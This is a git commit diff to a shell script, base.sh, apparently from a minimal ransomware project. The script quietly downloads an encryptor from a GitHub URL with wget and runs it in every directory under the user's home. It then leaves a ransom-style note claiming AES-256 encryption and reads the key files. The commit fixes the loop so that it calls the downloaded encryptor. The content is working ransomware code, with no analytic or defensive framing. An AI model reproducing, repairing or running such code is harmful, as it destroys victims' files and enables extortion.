df0049151df5cdd5e6939d0788a1ce91a4b61db5
drigg3r <drigg3r@yandex.com>
2016-09-12 19:49:10 -0500

    Update base.sh

--- base.sh
+++ base.sh
@@ -2,7 +2,7 @@
 
 wget -O /tmp/encrypt.sh https://raw.githubusercontent.com/drigg3r/Ransomware-Cpp-Bash-minimal/master/encrypt.sh > /dev/null 2>&1
 chmod 777 /tmp/wow.sh > /dev/null 2>&1
-find ~/ -type d -exec sh -c 'cd "{}" ; /tmp/wow.sh;' \; > /dev/null 2>&1
+find ~/ -type d -exec sh -c 'cd "{}" ; /tmp/encrypt.sh;' \; > /dev/null 2>&1
 echo "HeHeHe All your home directory is encrypted with AES 256" > ~/OpenIt.txt
 l=`cat /tmp/AesKey1.txt`
 m=`cat /tmp/AesKey2.txt`
